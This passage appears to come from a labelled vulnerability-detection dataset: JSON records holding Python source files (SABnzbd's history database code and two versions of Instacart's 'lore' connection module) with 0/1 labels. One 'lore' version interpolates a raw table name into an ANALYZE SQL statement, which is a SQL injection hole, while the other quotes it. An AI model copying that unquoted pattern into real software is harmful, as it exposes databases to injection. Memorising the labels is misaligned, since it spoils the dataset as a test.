time.gmtime(time.time())\n        # month_timest = int(time.mktime((r.tm_year, r.tm_mon, 0, 0, 0, 1, r.tm_wday, r.tm_yday, r.tm_isdst)))\n        month_timest = int(this_month(time.time()))\n\n        month = 0\n        if self.execute('''SELECT sum(bytes) FROM history WHERE \"completed\">?''', (month_timest,)):\n            try:\n                month = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        # Amount downloaded this week\n        week_timest = int(this_week(time.time()))\n\n        week = 0\n        if self.execute('''SELECT sum(bytes) FROM history WHERE \"completed\">?''', (week_timest,)):\n            try:\n                week = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        return (total, month, week)\n\n    def get_script_log(self, nzo_id):\n        \"\"\" Return decompressed log file \"\"\"\n        data = ''\n        t = (nzo_id,)\n        if self.execute('SELECT script_log FROM history WHERE nzo_id=?', t):\n            try:\n                data = zlib.decompress(self.c.fetchone().get('script_log'))\n            except:\n                pass\n        return data\n\n    def get_name(self, nzo_id):\n        \"\"\" Return name of the job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        name = ''\n        if self.execute('SELECT name FROM history WHERE nzo_id=?', t):\n            try:\n                name = self.c.fetchone().get('name')\n            except AttributeError:\n                pass\n        return name\n\n    def get_path(self, nzo_id):\n        \"\"\" Return the `incomplete` path of the job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        path = ''\n        if self.execute('SELECT path FROM history WHERE nzo_id=?', t):\n            try:\n                path = self.c.fetchone().get('path')\n            except AttributeError:\n                pass\n        return path\n\n    def get_other(self, nzo_id):\n        \"\"\" Return additional data for job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        if self.execute('SELECT * FROM history WHERE nzo_id=?', t):\n            try:\n                items = self.c.fetchall()[0]\n                dtype = items.get('report')\n                url = items.get('url')\n                pp = items.get('pp')\n                script = items.get('script')\n                cat = items.get('category')\n            except (AttributeError, IndexError):\n                return '', '', '', '', ''\n        return dtype, url, pp, script, cat\n\n\ndef dict_factory(cursor, row):\n    \"\"\" Return a dictionary for the current database position \"\"\"\n    d = {}\n    for idx, col in enumerate(cursor.description):\n        d[col[0]] = row[idx]\n    return d\n\n\n_PP_LOOKUP = {0: '', 1: 'R', 2: 'U', 3: 'D'}\ndef build_history_info(nzo, storage='', downpath='', postproc_time=0, script_output='', script_line=''):\n    \"\"\" Collects all the information needed for the database \"\"\"\n\n    if not downpath:\n        downpath = nzo.downpath\n    path = decode_factory(downpath)\n    storage = decode_factory(storage)\n    script_line = decode_factory(script_line)\n\n    flagRepair, flagUnpack, flagDelete = nzo.repair_opts\n    nzo_info = decode_factory(nzo.nzo_info)\n\n    url = decode_factory(nzo.url)\n\n    completed = int(time.time())\n    name = decode_factory(nzo.final_name)\n\n    nzb_name = decode_factory(nzo.filename)\n    category = decode_factory(nzo.cat)\n    pp = _PP_LOOKUP.get(sabnzbd.opts_to_pp(flagRepair, flagUnpack, flagDelete), 'X')\n    script = decode_factory(nzo.script)\n    status = decode_factory(nzo.status)\n    nzo_id = nzo.nzo_id\n    bytes = nzo.bytes_downloaded\n\n    if script_output:\n        # Compress the output of the script\n        script_log = sqlite3.Binary(zlib.compress(script_output))\n        #\n    else:\n        script_log = ''\n\n    download_time = decode_factory(nzo_info.get('download_time', 0))\n\n    downloaded = nzo.bytes_downloaded\n    completeness = 0\n    fail_message = decode_factory(nzo.fail_msg)\n    url_info = nzo_info.get('details', '') or nzo_info.get('more_info', '')\n\n    # Get the dictionary containing the stages and their unpack process\n    stages = decode_factory(nzo.unpack_info)\n    # Pack the dictionary up into a single string\n    # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n    lines = []\n    for key, results in stages.iteritems():\n        lines.append('%s:::%s' % (key, ';'.join(results)))\n    stage_log = '\\r\\n'.join(lines)\n\n    # Reuse the old 'report' column to indicate a URL-fetch\n    report = 'future' if nzo.futuretype else ''\n\n    # Analyze series info only when job is finished\n    series = u''\n    if postproc_time:\n        seriesname, season, episode, dummy = sabnzbd.newsunpack.analyse_show(nzo.final_name)\n        if seriesname and season and episode:\n            series = u'%s/%s/%s' % (seriesname.lower(), season, episode)\n\n    # See whatever the first password was, for the Retry\n    password = ''\n    passwords = get_all_passwords(nzo)\n    if passwords:\n        password = passwords[0]\n\n    return (completed, name, nzb_name, category, pp, script, report, url, status, nzo_id, storage, path,\n            script_log, script_line, download_time, postproc_time, stage_log, downloaded, completeness,\n            fail_message, url_info, bytes, series, nzo.md5sum, password)\n\n\n\ndef unpack_history_info(item):\n    \"\"\" Expands the single line stage_log from the DB\n        into a python dictionary for use in the history display\n    \"\"\"\n    # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n    lst = item['stage_log']\n    if lst:\n        try:\n            lines = lst.split('\\r\\n')\n        except:\n            logging.error(T('Invalid stage logging in history for %s') + ' (\\\\r\\\\n)', unicoder(item['name']))\n            logging.debug('Lines: %s', lst)\n            lines = []\n        lst = [None for x in STAGES]\n        for line in lines:\n            stage = {}\n            try:\n                key, logs = line.split(':::')\n            except:\n                logging.debug('Missing key:::logs \"%s\"', line)\n                key = line\n                logs = ''\n            stage['name'] = key\n            stage['actions'] = []\n            try:\n                logs = logs.split(';')\n            except:\n                logging.error(T('Invalid stage logging in history for %s') + ' (;)', unicoder(item['name']))\n                logging.debug('Logs: %s', logs)\n                logs = []\n            for log in logs:\n                stage['actions'].append(log)\n            try:\n                lst[STAGES[key]] = stage\n            except KeyError:\n                lst.append(stage)\n        # Remove unused stages\n        item['stage_log'] = [x for x in lst if x is not None]\n\n    if item['script_log']:\n        item['script_log'] = ''\n    # The action line is only available for items in the postproc queue\n    if 'action_line' not in item:\n        item['action_line'] = ''\n    return item\n\n\ndef midnight_history_purge():\n    logging.info('Scheduled history purge')\n    history_db = HistoryDB()\n    history_db.auto_history_purge()\n    history_db.close()\n\n\ndef decode_factory(text):\n    \"\"\" Recursively looks through the supplied argument\n        and converts and text to Unicode\n    \"\"\"\n    if isinstance(text, str):\n        return unicoder(text)\n\n    elif isinstance(text, list):\n        new_text = []\n        for t in text:\n            new_text.append(decode_factory(t))\n        return new_text\n\n    elif isinstance(text, dict):\n        new_text = {}\n        for key in text:\n            new_text[key] = decode_factory(text[key])\n        return new_text\n    else:\n        return text\n/n/n/n", "label": 1}, {"id": "a0a5fd945a8bf128d4b9fb6a3ebc6306f82fa4d0", "code": "lore/__init__.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import absolute_import\n\nimport logging\nimport os\nimport sys\nimport atexit\n\nfrom lore import env, util, ansi\nfrom lore.ansi import underline\nfrom lore.util import timer\n\nlogger = logging.getLogger(__name__)\n\nif not (sys.version_info.major == 3 and sys.version_info.minor >= 6):\n    ModuleNotFoundError = ImportError\n\n\n__author__ = 'Montana Low and Jeremy Stanley'\n__copyright__ = 'Copyright \u00a9 2017, Instacart'\n__credits__ = ['Montana Low', 'Jeremy Stanley', 'Emmanuel Turlay']\n__license__ = 'MIT'\n__version__ = '0.4.46'\n__maintainer__ = 'Montana Low'\n__email__ = 'montana@instacart.com'\n__status__ = 'Development Status :: 3 - Alpha'\n\n\ndef banner():\n    import socket\n    import getpass\n    \n    return '%s in %s on %s' % (\n        ansi.foreground(ansi.GREEN, env.project),\n        ansi.foreground(env.color, env.name),\n        ansi.foreground(ansi.CYAN,\n                        getpass.getuser() + '@' + socket.gethostname())\n    )\n\n\nlore_no_env = False\nif hasattr(sys, 'lore_no_env'):\n    lore_no_env = sys.lore_no_env\n\nif len(sys.argv) > 1 and sys.argv[0][-4:] == 'lore' and sys.argv[1] in ['install', 'init']:\n    lore_no_env = True\n\nif not lore_no_env:\n    # everyone else gets validated and launched on import\n    env.validate()\n    env.launch()\n\nif env.launched():\n    print(banner())\n    logger.info(banner())\n    logger.debug('python environment: %s' % env.prefix)\n\n    if not lore_no_env:\n        with timer('check requirements', logging.DEBUG):\n            install_missing = env.name in [env.DEVELOPMENT, env.TEST]\n            env.check_requirements(install_missing)\n        \n    try:\n        with timer('numpy init', logging.DEBUG):\n            import numpy\n        \n            numpy.random.seed(1)\n            logger.debug('numpy.random.seed(1)')\n    except ModuleNotFoundError as e:\n        pass\n\n    try:\n        with timer('rollbar init', logging.DEBUG):\n            import rollbar\n            rollbar.init(\n                os.environ.get(\"ROLLBAR_ACCESS_TOKEN\", None),\n                allow_logging_basic_config=False,\n                environment=env.name,\n                enabled=(env.name != env.DEVELOPMENT),\n                handler='blocking',\n                locals={\"enabled\": True})\n    \n            def report_error(exc_type, value, tb):\n                import traceback\n                logger.critical('Exception: %s' % ''.join(\n                    traceback.format_exception(exc_type, value, tb)))\n                if hasattr(sys, 'ps1'):\n                    print(''.join(traceback.format_exception(exc_type, value, tb)))\n                else:\n                    rollbar.report_exc_info((exc_type, value, tb))\n            sys.excepthook = report_error\n\n    except ModuleNotFoundError as e:\n        def report_error(exc_type, value, tb):\n            import traceback\n            logger.critical('Exception: %s' % ''.join(\n                traceback.format_exception(exc_type, value, tb)))\n            \n        sys.excepthook = report_error\n        pass\n/n/n/nlore/io/connection.py/n/nimport hashlib\nimport inspect\nimport logging\nimport os\nimport re\nimport sys\nimport tempfile\nimport csv\nimport gzip\nfrom datetime import datetime\nfrom time import time\nfrom io import StringIO\nfrom sqlalchemy import event\nfrom sqlalchemy.engine import Engine\nfrom sqlalchemy.schema import DropTable\nfrom sqlalchemy.ext.compiler import compiles\n\nimport pandas\nimport sqlalchemy\n\nimport lore\nfrom lore.util import timer\nfrom lore.stores import query_cached\n\n\nlogger = logging.getLogger(__name__)\n\n\n@compiles(DropTable, 'postgresql')\ndef _compile_drop_table(element, compiler, **kwargs):\n    return compiler.visit_drop_table(element) + ' CASCADE'\n\n\nclass Connection(object):\n    UNLOAD_PREFIX = os.path.join(lore.env.name, 'unloads')\n    IAM_ROLE = os.environ.get('IAM_ROLE', None)\n    \n    def __init__(self, url, **kwargs):\n        for int_value in ['pool_size', 'pool_recycle', 'max_overflow']:\n            if int_value in kwargs:\n                kwargs[int_value] = int(kwargs[int_value])\n        if 'poolclass' in kwargs:\n            kwargs['poolclass'] = getattr(sqlalchemy.pool, kwargs['poolclass'])\n        if '__name__' in kwargs:\n            del kwargs['__name__']\n        self._engine = sqlalchemy.create_engine(url, **kwargs)\n        self._connection = None\n        self._metadata = None\n        self._transactions = []\n    \n    def __enter__(self):\n        if self._connection is None:\n            self._connection = self._engine.connect()\n        self._transactions.append(self._connection.begin())\n        return self\n    \n    def __exit__(self, type, value, traceback):\n        transaction = self._transactions.pop()\n        if type is None:\n            transaction.commit()\n        else:\n            transaction.rollback()\n\n    @staticmethod\n    def path(filename, extension='.sql'):\n        return os.path.join(\n            lore.env.root, lore.env.project, 'extracts',\n            filename + extension)\n\n    def execute(self, sql=None, filename=None, **kwargs):\n        self.__execute(self.__prepare(sql, filename), kwargs)\n\n    def insert(self, table, dataframe, batch_size=None):\n        if batch_size is None:\n            batch_size = len(dataframe)\n\n        if self._connection is None:\n            self._connection = self._engine.connect()\n\n        dataframe.to_sql(\n            table,\n            self._connection,\n            if_exists='append',\n            index=False,\n            chunksize=batch_size\n        )\n\n    def replace(self, table, dataframe, batch_size=None):\n        import migrate.changeset\n        global _after_replace_callbacks\n        \n        with timer('REPLACE ' + table):\n            suffix = datetime.now().strftime('_%Y%m%d%H%M%S').encode('utf-8')\n            self.metadata\n            temp = 'tmp_'.encode('utf-8')\n            source = sqlalchemy.Table(table, self.metadata, autoload=True, autoload_with=self._engine)\n            destination_name = 'tmp_' + hashlib.sha256(temp + table.encode('utf-8') + suffix).hexdigest()[0:56]\n            destination = sqlalchemy.Table(destination_name, self.metadata, autoload=False)\n            for column in source.columns:\n                destination.append_column(column.copy())\n            destination.create()\n\n            original_names = {}\n            for index in source.indexes:\n                # make sure the name is < 63 chars with the suffix\n                name = hashlib.sha256(temp + index.name.encode('utf-8') + suffix).hexdigest()[0:60]\n                original_names[name] = index.name\n                columns = []\n                for column in index.columns:\n                    columns.append(next(x for x in destination.columns if x.name == column.name))\n                new = sqlalchemy.Index(name, *columns)\n                new.unique = index.unique\n                new.table = destination\n                new.create(bind=self._connection)\n            self.insert(destination.name, dataframe, batch_size=batch_size)\n            self.execute(\"BEGIN; SET LOCAL statement_timeout = '1min'; ANALYZE %s; COMMIT;\" % self.quote_identifier(table))\n\n            with self as transaction:\n                backup = sqlalchemy.Table(table + '_b', self.metadata)\n                backup.drop(bind=self._connection, checkfirst=True)\n                source.rename(name=source.name + '_b', connection=self._connection)\n                destination.rename(name=table, connection=self._connection)\n                for index in source.indexes:\n                    index.rename(index.name[0:-2] + '_b', connection=self._connection)\n                for index in destination.indexes:\n                    index.rename(original_names[index.name], connection=self._connection)\n        \n        for func in _after_replace_callbacks:\n            func(destination, source)\n        \n    @property\n    def metadata(self):\n        if not self._metadata:\n            self._metadata = sqlalchemy.MetaData(bind=self._engine)\n\n        return self._metadata\n\n    def select(self, sql=None, filename=None, **kwargs):\n        cache = kwargs.pop('cache', False)\n        sql = self.__prepare(sql, filename)\n        return self._select(sql, kwargs, cache=cache)\n\n    @query_cached\n    def _select(self, sql, bindings):\n        return self.__execute(sql, bindings).fetchall()\n\n    def unload(self, sql=None, filename=None, **kwargs):\n        cache = kwargs.pop('cache', False)\n        sql = self.__prepare(sql, filename)\n        return self._unload(sql, kwargs, cache=cache)\n    \n    @query_cached\n    def _unload(self, sql, bindings):\n        key = hashlib.sha1(str(sql).encode('utf-8')).hexdigest()\n\n        match = re.match(r'.*?select\\s(.*)from.*', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)\n        if match:\n            columns = []\n            nested = 0\n            potential = match[1].split(',')\n            for column in potential:\n                nested += column.count('(')\n                nested -= column.count(')')\n                if nested == 0:\n                    columns.append(column.split()[-1].split('.')[-1].strip())\n                elif column == potential[-1]:\n                    column = re.split('from', column, flags=re.IGNORECASE)[0].strip()\n                    columns.append(column.split()[-1].split('.')[-1].strip())\n        else:\n            columns = []\n        logger.warning(\"Redshift unload requires poorly parsing column names from sql, found: {}\".format(columns))\n\n        sql = \"UNLOAD ('\" + sql.replace('\\\\', '\\\\\\\\').replace(\"'\", \"\\\\'\") + \"') \"\n        sql += \"TO 's3://\" + os.path.join(\n            lore.io.bucket.name,\n            self.UNLOAD_PREFIX,\n            key,\n            ''\n        ) + \"' \"\n        if Connection.IAM_ROLE:\n            sql += \"IAM_ROLE '\" + Connection.IAM_ROLE + \"' \"\n        sql += \"DELIMITER '|' ADDQUOTES GZIP ALLOWOVERWRITE\"\n        if re.match(r'(.*?)(limit\\s+\\d+)(.*)', sql, re.IGNORECASE | re.UNICODE | re.DOTALL):\n            logger.warning('LIMIT clause is not supported by unload, returning full set.')\n            sql = re.sub(r'(.*?)(limit\\s+\\d+)(.*)', r'\\1\\3', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)\n        self.__execute(sql, bindings)\n        return key, columns\n\n    @query_cached\n    def load(self, key, columns):\n        result = [columns]\n        with timer('load:'):\n            for entry in lore.io.bucket.objects.filter(\n                Prefix=os.path.join(self.UNLOAD_PREFIX, key)\n            ):\n                temp = tempfile.NamedTemporaryFile()\n                lore.io.bucket.download_file(entry.key, temp.name)\n                with gzip.open(temp.name, 'rt') as gz:\n                    result += list(csv.reader(gz, delimiter='|', quotechar='\"'))\n        \n            return result\n    \n    @query_cached\n    def load_dataframe(self, key, columns):\n        with timer('load_dataframe:'):\n            frames = []\n            for entry in lore.io.bucket.objects.filter(\n                Prefix=os.path.join(self.UNLOAD_PREFIX, key)\n            ):\n                temp = tempfile.NamedTemporaryFile()\n                lore.io.bucket.download_file(entry.key, temp.name)\n                dataframe = pandas.read_csv(\n                    temp.name,\n                    delimiter='|',\n                    quotechar='\"',\n                    compression='gzip',\n                    error_bad_lines=False\n                )\n                dataframe.columns = columns\n                frames.append(dataframe)\n\n            result = pandas.concat(frames)\n            result.columns = columns\n            buffer = StringIO()\n            result.info(buf=buffer, memory_usage='deep')\n            logger.info(buffer.getvalue())\n            logger.info(result.head())\n            return result\n        \n    def dataframe(self, sql=None, filename=None, **kwargs):\n        cache = kwargs.pop('cache', False)\n        sql = self.__prepare(sql, filename)\n        dataframe = self._dataframe(sql, kwargs, cache=cache)\n        buffer = StringIO()\n        dataframe.info(buf=buffer, memory_usage='deep')\n        logger.info(buffer.getvalue())\n        logger.info(dataframe.head())\n        return dataframe\n        \n    @query_cached\n    def _dataframe(self, sql, bindings):\n        with timer(\"dataframe:\"):\n            if self._connection is None:\n                self._connection = self._engine.connect()\n            dataframe = pandas.read_sql(sql=sql, con=self._connection, params=bindings)\n            return dataframe\n\n    def quote_identifier(self, identifier):\n        return self._engine.dialect.identifier_preparer.quote(identifier)\n        \n\n    def __prepare(self, sql, filename):\n        if sql is None and filename is not None:\n            filename = Connection.path(filename, '.sql')\n            logger.debug(\"READ SQL FILE: \" + filename)\n            with open(filename) as file:\n                sql = file.read()\n        # support mustache style bindings\n        sql = re.sub(r'\\{(\\w+?)\\}', r'%(\\1)s', sql)\n        return sql\n\n    def __execute(self, sql, bindings):\n        if self._connection is None:\n            self._connection = self._engine.connect()\n        return self._connection.execute(sql, bindings)\n\n\n@event.listens_for(Engine, \"before_cursor_execute\", retval=True)\ndef comment_sql_calls(conn, cursor, statement, parameters, context, executemany):\n    conn.info.setdefault('query_start_time', []).append(datetime.now())\n\n    stack = inspect.stack()[1:-1]\n    if sys.version_info.major == 3:\n        stack = [(x.filename, x.lineno, x.function) for x in stack]\n    else:\n        stack = [(x[1], x[2], x[3]) for x in stack]\n\n    paths = [x[0] for x in stack]\n    origin = next((x for x in paths if lore.env.project in x), None)\n    if origin is None:\n        origin = next((x for x in paths if 'sqlalchemy' not in x), None)\n    if origin is None:\n        origin = paths[0]\n    caller = next(x for x in stack if x[0] == origin)\n\n    statement = \"/* %s | %s:%d in %s */\\n\" % (lore.env.project, caller[0], caller[1], caller[2]) + statement\n    logger.debug(statement)\n    return statement, parameters\n\n\n@event.listens_for(Engine, \"after_cursor_execute\")\ndef time_sql_calls(conn, cursor, statement, parameters, context, executemany):\n    total = datetime.now() - conn.info['query_start_time'].pop(-1)\n    logger.info(\"SQL: %s\" % total)\n\n\n_after_replace_callbacks = []\ndef after_replace(func):\n    global _after_replace_callbacks\n    _after_replace_callbacks.append(func)\n/n/n/n", "label": 0}, {"id": "a0a5fd945a8bf128d4b9fb6a3ebc6306f82fa4d0", "code": "/lore/__init__.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import absolute_import\n\nimport logging\nimport os\nimport sys\nimport atexit\n\nfrom lore import env, util, ansi\nfrom lore.ansi import underline\nfrom lore.util import timer\n\nlogger = logging.getLogger(__name__)\n\nif not (sys.version_info.major == 3 and sys.version_info.minor >= 6):\n    ModuleNotFoundError = ImportError\n\n\n__author__ = 'Montana Low and Jeremy Stanley'\n__copyright__ = 'Copyright \u00a9 2017, Instacart'\n__credits__ = ['Montana Low', 'Jeremy Stanley', 'Emmanuel Turlay']\n__license__ = 'MIT'\n__version__ = '0.4.45'\n__maintainer__ = 'Montana Low'\n__email__ = 'montana@instacart.com'\n__status__ = 'Development Status :: 3 - Alpha'\n\n\ndef banner():\n    import socket\n    import getpass\n    \n    return '%s in %s on %s' % (\n        ansi.foreground(ansi.GREEN, env.project),\n        ansi.foreground(env.color, env.name),\n        ansi.foreground(ansi.CYAN,\n                        getpass.getuser() + '@' + socket.gethostname())\n    )\n\n\nlore_no_env = False\nif hasattr(sys, 'lore_no_env'):\n    lore_no_env = sys.lore_no_env\n\nif len(sys.argv) > 1 and sys.argv[0][-4:] == 'lore' and sys.argv[1] in ['install', 'init']:\n    lore_no_env = True\n\nif not lore_no_env:\n    # everyone else gets validated and launched on import\n    env.validate()\n    env.launch()\n\nif env.launched():\n    print(banner())\n    logger.info(banner())\n    logger.debug('python environment: %s' % env.prefix)\n\n    if not lore_no_env:\n        with timer('check requirements', logging.DEBUG):\n            install_missing = env.name in [env.DEVELOPMENT, env.TEST]\n            env.check_requirements(install_missing)\n        \n    try:\n        with timer('numpy init', logging.DEBUG):\n            import numpy\n        \n            numpy.random.seed(1)\n            logger.debug('numpy.random.seed(1)')\n    except ModuleNotFoundError as e:\n        pass\n\n    try:\n        with timer('rollbar init', logging.DEBUG):\n            import rollbar\n            rollbar.init(\n                os.environ.get(\"ROLLBAR_ACCESS_TOKEN\", None),\n                allow_logging_basic_config=False,\n                environment=env.name,\n                enabled=(env.name != env.DEVELOPMENT),\n                handler='blocking',\n                locals={\"enabled\": True})\n    \n            def report_error(exc_type, value, tb):\n                import traceback\n                logger.critical('Exception: %s' % ''.join(\n                    traceback.format_exception(exc_type, value, tb)))\n                if hasattr(sys, 'ps1'):\n                    print(''.join(traceback.format_exception(exc_type, value, tb)))\n                else:\n                    rollbar.report_exc_info((exc_type, value, tb))\n            sys.excepthook = report_error\n\n    except ModuleNotFoundError as e:\n        def report_error(exc_type, value, tb):\n            import traceback\n            logger.critical('Exception: %s' % ''.join(\n                traceback.format_exception(exc_type, value, tb)))\n            \n        sys.excepthook = report_error\n        pass\n/n/n/n/lore/io/connection.py/n/nimport hashlib\nimport inspect\nimport logging\nimport os\nimport re\nimport sys\nimport tempfile\nimport csv\nimport gzip\nfrom datetime import datetime\nfrom time import time\nfrom io import StringIO\nfrom sqlalchemy import event\nfrom sqlalchemy.engine import Engine\nfrom sqlalchemy.schema import DropTable\nfrom sqlalchemy.ext.compiler import compiles\n\nimport pandas\nimport sqlalchemy\n\nimport lore\nfrom lore.util import timer\nfrom lore.stores import query_cached\n\n\nlogger = logging.getLogger(__name__)\n\n\n@compiles(DropTable, 'postgresql')\ndef _compile_drop_table(element, compiler, **kwargs):\n    return compiler.visit_drop_table(element) + ' CASCADE'\n\n\nclass Connection(object):\n    UNLOAD_PREFIX = os.path.join(lore.env.name, 'unloads')\n    IAM_ROLE = os.environ.get('IAM_ROLE', None)\n    \n    def __init__(self, url, **kwargs):\n        for int_value in ['pool_size', 'pool_recycle', 'max_overflow']:\n            if int_value in kwargs:\n                kwargs[int_value] = int(kwargs[int_value])\n        if 'poolclass' in kwargs:\n            kwargs['poolclass'] = getattr(sqlalchemy.pool, kwargs['poolclass'])\n        if '__name__' in kwargs:\n            del kwargs['__name__']\n        self._engine = sqlalchemy.create_engine(url, **kwargs)\n        self._connection = None\n        self._metadata = None\n        self._transactions = []\n    \n    def __enter__(self):\n        if self._connection is None:\n            self._connection = self._engine.connect()\n        self._transactions.append(self._connection.begin())\n        return self\n    \n    def __exit__(self, type, value, traceback):\n        transaction = self._transactions.pop()\n        if type is None:\n            transaction.commit()\n        else:\n            transaction.rollback()\n\n    @staticmethod\n    def path(filename, extension='.sql'):\n        return os.path.join(\n            lore.env.root, lore.env.project, 'extracts',\n            filename + extension)\n\n    def execute(self, sql=None, filename=None, **kwargs):\n        self.__execute(self.__prepare(sql, filename), kwargs)\n\n    def insert(self, table, dataframe, batch_size=None):\n        if batch_size is None:\n            batch_size = len(dataframe)\n\n        if self._connection is None:\n            self._connection = self._engine.connect()\n\n        dataframe.to_sql(\n            table,\n            self._connection,\n            if_exists='append',\n            index=False,\n            chunksize=batch_size\n        )\n\n    def replace(self, table, dataframe, batch_size=None):\n        import migrate.changeset\n        global _after_replace_callbacks\n        \n        with timer('REPLACE ' + table):\n            suffix = datetime.now().strftime('_%Y%m%d%H%M%S').encode('utf-8')\n            self.metadata\n            temp = 'tmp_'.encode('utf-8')\n            source = sqlalchemy.Table(table, self.metadata, autoload=True, autoload_with=self._engine)\n            destination_name = 'tmp_' + hashlib.sha256(temp + table.encode('utf-8') + suffix).hexdigest()[0:56]\n            destination = sqlalchemy.Table(destination_name, self.metadata, autoload=False)\n            for column in source.columns:\n                destination.append_column(column.copy())\n            destination.create()\n\n            original_names = {}\n            for index in source.indexes:\n                # make sure the name is < 63 chars with the suffix\n                name = hashlib.sha256(temp + index.name.encode('utf-8') + suffix).hexdigest()[0:60]\n                original_names[name] = index.name\n                columns = []\n                for column in index.columns:\n                    columns.append(next(x for x in destination.columns if x.name == column.name))\n                new = sqlalchemy.Index(name, *columns)\n                new.unique = index.unique\n                new.table = destination\n                new.create(bind=self._connection)\n            self.insert(destination.name, dataframe, batch_size=batch_size)\n            self.execute(\"BEGIN; SET LOCAL statement_timeout = '1min'; ANALYZE %s; COMMIT;\" % table)\n\n            with self as transaction:\n                backup = sqlalchemy.Table(table + '_b', self.metadata)\n                backup.drop(bind=self._connection, checkfirst=True)\n                source.rename(name=source.name + '_b', connection=self._connection)\n                destination.rename(name=table, connection=self._connection)\n                for index in source.indexes:\n                    index.rename(index.name[0:-2] + '_b', connection=self._connection)\n                for index in destination.indexes:\n                    index.rename(original_names[index.name], connection=self._connection)\n        \n        for func in _after_replace_callbacks:\n            func(destination, source)\n        \n    @property\n    def metadata(self):\n        if not self._metadata:\n            self._metadata = sqlalchemy.MetaData(bind=self._engine)\n\n        return self._metadata\n\n    def select(self, sql=None, filename=None, **kwargs):\n        cache = kwargs.pop('cache', False)\n        sql = self.__prepare(sql, filename)\n        return self._select(sql, kwargs, cache=cache)\n\n    @query_cached\n    def _select(self, sql, bindings):\n        return self.__execute(sql, bindings).fetchall()\n\n    def unload(self, sql=None, filename=None, **kwargs):\n        cache = kwargs.pop('cache', False)\n        sql = self.__prepare(sql, filename)\n        return self._unload(sql, kwargs, cache=cache)\n    \n    @query_cached\n    def _unload(self, sql, bindings):\n        key = hashlib.sha1(str(sql).encode('utf-8')).hexdigest()\n\n        match = re.match(r'.*?select\\s(.*)from.*', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)\n        if match:\n            columns = []\n            nested = 0\n            potential = match[1].split(',')\n            for column in potential:\n                nested += column.count('(')\n                nested -= column.count(')')\n                if nested == 0:\n                    columns.append(column.split()[-1].split('.')[-1].strip())\n                elif column == potential[-1]:\n                    column = re.split('from', column, flags=re.IGNORECASE)[0].strip()\n                    columns.append(column.split()[-1].split('.')[-1].strip())\n        else:\n            columns = []\n        logger.warning(\"Redshift unload requires poorly parsing column names from sql, found: {}\".format(columns))\n\n        sql = \"UNLOAD ('\" + sql.replace('\\\\', '\\\\\\\\').replace(\"'\", \"\\\\'\") + \"') \"\n        sql += \"TO 's3://\" + os.path.join(\n            lore.io.bucket.name,\n            self.UNLOAD_PREFIX,\n            key,\n            ''\n        ) + \"' \"\n        if Connection.IAM_ROLE:\n            sql += \"IAM_ROLE '\" + Connection.IAM_ROLE + \"' \"\n        sql += \"DELIMITER '|' ADDQUOTES GZIP ALLOWOVERWRITE\"\n        if re.match(r'(.*?)(limit\\s+\\d+)(.*)', sql, re.IGNORECASE | re.UNICODE | re.DOTALL):\n            logger.warning('LIMIT clause is not supported by unload, returning full set.')\n            sql = re.sub(r'(.*?)(limit\\s+\\d+)(.*)', r'\\1\\3', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)\n        self.__execute(sql, bindings)\n        return key, columns\n\n    @query_cached\n    def load(self, key, columns):\n        result = [columns]\n        with timer('load:'):\n            for entry in lore.io.bucket.objects.filter(\n                Prefix=os.path.join(self.UNLOAD_PREFIX, key)\n            ):\n                temp = tempfile.NamedTemporaryFile()\n                lore.io.bucket.download_file(entry.key, temp.name)\n                with gzip.open(temp.name, 'rt') as gz:\n                    result += list(csv.reader(gz, delimiter='|', quotechar='\"'))\n        \n            return result\n    \n    @query_cached\n    def load_dataframe(self, key, columns):\n        with timer('load_dataframe:'):\n            frames = []\n            for entry in lore.io.bucket.objects.filter(\n                Prefix=os.path.join(self.UNLOAD_PREFIX, key)\n            ):\n                temp = tempfile.NamedTemporaryFile()\n                lore.io.bucket.download_file(entry.key, temp.name)\n                dataframe = pandas.read_csv(\n                    temp.name,\n                    delimiter='|',\n                    quotechar='\"',\n                    compression='gzip',\n                    error_bad_lines=False\n                )\n                dataframe.columns = columns\n                frames.append(dataframe)\n\n            result = pandas.concat(frames)\n            result.columns = columns\n            buffer = StringIO()\n            result.info(buf=buffer, memory_usage='deep')\n            logger.info(buffer.getvalue())\n            logger.info(result.head())\n            return result\n        \n    def dataframe(self, sql=None, filename=None, **kwargs):\n        cache = kwargs.pop('cache', False)\n        sql = self.__prepare(sql, filename)\n        dataframe = self._dataframe(sql, kwargs, cache=cache)\n        buffer = StringIO()\n        dataframe.info(buf=buffer, memory_usage='deep')\n        logger.info(buffer.getvalue())\n        logger.info(dataframe.head())\n        return dataframe\n        \n    @query_cached\n    def _dataframe(self, sql, bindings):\n        with timer(\"dataframe:\"):\n            if self._connection is None:\n                self._connection = self._engine.connect()\n            dataframe = pandas.read_sql(sql=sql, con=self._connection, params=bindings)\n            return dataframe\n\n    def quote_identifier(self, identifier):\n        return self._engine.dialect.identifier_preparer.quote(identifier)\n        \n\n    def __prepare(self, sql, filename):\n        if sql is None and filename is not None:\n            filename = Connection.path(filename, '.sql')\n            logger.debug(\"READ SQL FILE: \" + filename)\n            with open(filename) as file:\n                sql = file.read()\n        # support mustache style bindings\n        sql = re.sub(r'\\{(\\w+?)\\}', r'%(\\1)s', sql)\n        return sql\n\n    def __execute(self, sql, bindings):\n        if self._connection is None:\n            self._connection = self._engine.connect()\n        return self._connection.execute(sql, bindings)\n\n\n@event.listens_for(Engine, \"before_cursor_execute\", retval=True)\ndef comment_sql_calls(conn, cursor, statement, parameters, context, executemany):\n    conn.info.setdefault('query_start_time', []).append(datetime.now())\n\n    stack = inspect.stack()[1:-1]\n    if sys.version_info.major == 3:\n        stack = [(x.filename, x.lineno, x.function) for x in stack]\n    else:\n        stack = [(x[1], x[2], x[3]) for x in stack]\n\n    paths = [x[0] for x in stack]\n    origin = next((x for x in paths if lore.env.project in x), None)\n    if origin is None:\n        origin = next((x for x in paths if 'sqlalchemy' not in x), None)\n    if origin is 